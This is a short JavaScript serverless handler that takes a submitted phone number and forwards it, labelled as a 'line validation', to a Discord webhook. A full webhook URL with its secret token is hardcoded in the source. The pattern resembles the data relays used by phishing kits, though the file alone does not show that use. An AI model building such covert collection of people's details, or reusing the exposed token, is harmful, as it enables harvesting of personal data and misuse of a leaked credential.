// api/send.js
export default async function handler(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ ok: false, error: "Método no permitido" });
  }

  try {
    const { linea } = req.body;

    if (!linea) {
      return res.status(400).json({ ok: false, error: "Número vacío" });
    }

    const mensaje = `📲 **Nueva validación de línea:**\n🔢 Número: ${linea}\n🕒 Fecha: ${new Date().toLocaleString("es-CO")}`;

    // 👉 pon tu webhook aquí
    const webhook = "https://discord.com/api/webhooks/1416167076737056868/N0PLYys9FxoMqosemT9ACC6Il9qJlS1lmAkgriwfjugHpUPWd9ozsimjK5NdhYTRxiHS";

    const resp = await fetch(webhook, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ content: mensaje }),
    });

    if (!resp.ok) {
      return res.status(500).json({ ok: false, error: "Error al enviar a Discord" });
    }

    return res.status(200).json({ ok: true, msg: "Número enviado" });
  } catch (err) {
    console.error(err);
    return res.status(500).json({ ok: false, error: "Error interno" });
  }
}


